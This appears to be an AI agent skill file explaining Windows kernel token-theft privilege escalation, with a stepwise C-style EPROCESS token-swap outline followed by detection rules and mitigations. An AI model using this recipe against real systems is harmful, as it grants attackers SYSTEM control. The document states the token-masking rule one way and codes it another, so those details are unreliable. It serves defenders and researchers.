---
name: windows-kernel-token-theft-analysis
description: Analyze and explain Windows kernel privilege escalation via token theft when arbitrary kernel R/W primitives are available. Use this skill when investigating kernel vulnerabilities, reviewing exploit code, understanding EPROCESS token manipulation, or developing defensive controls against token theft attacks. Trigger for any questions about Windows kernel exploitation, EPROCESS structures, token stealing techniques, or kernel vulnerability analysis.
---

# Windows Kernel Token Theft Analysis

This skill helps security researchers and defenders understand Windows kernel privilege escalation via token theft when arbitrary kernel read/write primitives are available.

## When to Use This Skill

Use this skill when:
- Analyzing kernel vulnerabilities that expose arbitrary R/W primitives
- Reviewing or understanding token theft exploit code
- Investigating EPROCESS structure manipulation techniques
- Developing detection rules for kernel token theft attacks
- Understanding Windows kernel privilege escalation vectors
- Conducting authorized penetration testing or red teaming
- Building defensive controls against kernel exploitation

## Core Concept

When a vulnerable driver exposes arbitrary kernel read/write capabilities, attackers can escalate to `NT AUTHORITY\SYSTEM` by stealing a SYSTEM access token. The technique copies the Token pointer from a SYSTEM process's EPROCESS into the current process's EPROCESS.

### Why It Works

- Each process has an EPROCESS structure containing a Token field (EX_FAST_REF to a token object)
- The SYSTEM process (PID 4) holds a token with all privileges enabled
- Replacing the current process's EPROCESS.Token with the SYSTEM token pointer makes the current process run as SYSTEM immediately

## EPROCESS Structure Analysis

### Key Offsets (Version-Dependent)

```c
// Example offsets - MUST be resolved per Windows build
// Use WinDbg: dt nt!_EPROCESS with target PDBs

EPROCESS_UniqueProcessId    // Process ID field
EPROCESS_Token              // Token pointer (EX_FAST_REF)
EPROCESS_ActiveProcessLinks // Doubly-linked list for process enumeration
```

### EX_FAST_REF Token Field

The Token field is an EX_FAST_REF structure:
- Upper bits: Pointer to the token object
- Lower 3 bits: Reference count flags
- Mask: `0xFFFFFFFFFFFFFFF8` (x64) to clear refcount bits

## Attack Flow Analysis

### Step 1: Locate Kernel Base and Symbols

```c
// Get ntoskrnl.exe base address
// Methods:
// - EnumDeviceDrivers() - first driver is typically ntoskrnl
// - NtQuerySystemInformation(SystemModuleInformation)
// - Parse PEB loaded module list

uint64_t ntoskrnl_base = get_kernel_base();
uint64_t PsInitialSystemProcess = ntoskrnl_base + symbol_offset;
```

### Step 2: Read SYSTEM EPROCESS Pointer

```c
// PsInitialSystemProcess points to SYSTEM's EPROCESS
uint64_t eprocess_system;
kread(PsInitialSystemProcess, &eprocess_system);
```

### Step 3: Traverse ActiveProcessLinks to Find Current Process

```c
// Walk the doubly-linked list of EPROCESS structures
// Find the EPROCESS where UniqueProcessId == GetCurrentProcessId()

uint64_t eprocess_current = find_eprocess_by_pid(eprocess_system, my_pid);
```

### Step 4: Read and Manipulate Token Pointers

```c
// Read SYSTEM token
uint64_t token_system;
kread(eprocess_system + offset_token, &token_system);

// Read current process token
uint64_t token_current;
kread(eprocess_current + offset_token, &token_current);

// Preserve refcount bits from current token
uint64_t token_masked = token_system & ~0xF;  // Clear refcount bits
uint64_t token_new = token_masked | (token_current & 0x7);  // Splice refcount
```

### Step 5: Write New Token to Current Process

```c
// Write the modified token pointer back
kwrite(eprocess_current + offset_token, token_new);

// Process is now SYSTEM
```

## Detection Indicators

### Behavioral Indicators

1. **Suspicious IOCTL sequences**
   - Rapid kernel read/write operations
   - Access to EPROCESS structures
   - Token field manipulation patterns

2. **Process enumeration patterns**
   - Walking ActiveProcessLinks from user mode
   - Reading EPROCESS structures via vulnerable driver

3. **Token swap signatures**
   - Writing to EPROCESS.Token field
   - EX_FAST_REF manipulation patterns

### EDR Detection Rules

```yaml
# Example detection logic
- Pattern: "Arbitrary kernel R/W via vulnerable driver"
  - Multiple sequential kernel read operations
  - Followed by kernel write to EPROCESS.Token
  - Source: User-mode process with vulnerable driver handle

- Pattern: "EPROCESS traversal from user mode"
  - Reading PsInitialSystemProcess
  - Walking ActiveProcessLinks
  - Reading UniqueProcessId fields
```

## Mitigation Strategies

### Prevention

1. **Driver Signing Enforcement**
   - Enable Kernel Driver Blocklist (HVCI/CI)
   - Use DeviceGuard policies
   - Require signed drivers only

2. **Attack Surface Reduction**
   - Block unsigned driver loading
   - Restrict driver installation privileges
   - Use Windows Defender Application Control

3. **Vulnerable Driver Management**
   - Audit loaded drivers regularly
   - Remove unnecessary third-party drivers
   - Keep drivers updated

### Detection

1. **EDR Monitoring**
   - Monitor for suspicious IOCTL sequences
   - Alert on kernel R/W patterns
   - Track EPROCESS access from user mode

2. **Kernel Callbacks**
   - Use CmRegisterCallback for object access
   - Monitor PsSetCreateProcessNotifyRoutine
   - Track token manipulation events

3. **Integrity Monitoring**
   - Monitor EPROCESS.Token field changes
   - Alert on unexpected privilege escalations
   - Track process token modifications

## Offset Resolution Methods

### Method 1: WinDbg with PDBs

```windbg
!loadkd symstore
lm  // List modules
dt nt!_EPROCESS  // Dump structure with offsets
```

### Method 2: Runtime Symbol Loading

```c
// Use DbgHelp.dll or similar
// Load kernel PDB and query symbol offsets
// Requires matching PDB to target system
```

### Method 3: Heuristic Detection

```c
// Scan EPROCESS for known patterns
// Look for UniqueProcessId values
// Validate against known process IDs
```

## Common Pitfalls

### Offset Mismatches

- Offsets vary significantly across Windows versions
- Always resolve offsets for the target system
- Hardcoded offsets will fail on different builds

### EX_FAST_REF Handling

- Low 3 bits contain reference count
- Must preserve these bits when swapping tokens
- Incorrect handling can cause instability

### Process Stability

- Prefer elevating the current process
- Short-lived elevated processes may lose SYSTEM when exiting
- Consider spawning new processes after elevation

## Authorized Use Only

This information is for:
- Security research and education
- Authorized penetration testing
- Defensive security development
- Vulnerability analysis and remediation

**Never use these techniques on systems without explicit authorization.**

## References

- [FuzzySecurity – Windows Kernel ExploitDev](https://www.fuzzysecurity.com/tutorials/expDev/17.html)
- [Windows Internals, Part 1](https://www.microsoftpressstore.com/store/windows-internals-part-1-9781482211695)
- [Microsoft Security Response Center - Kernel Vulnerabilities](https://msrc.microsoft.com/)

## Related Skills

- Windows kernel vulnerability analysis
- EDR detection rule development
- Penetration testing methodology
- Security research and disclosure
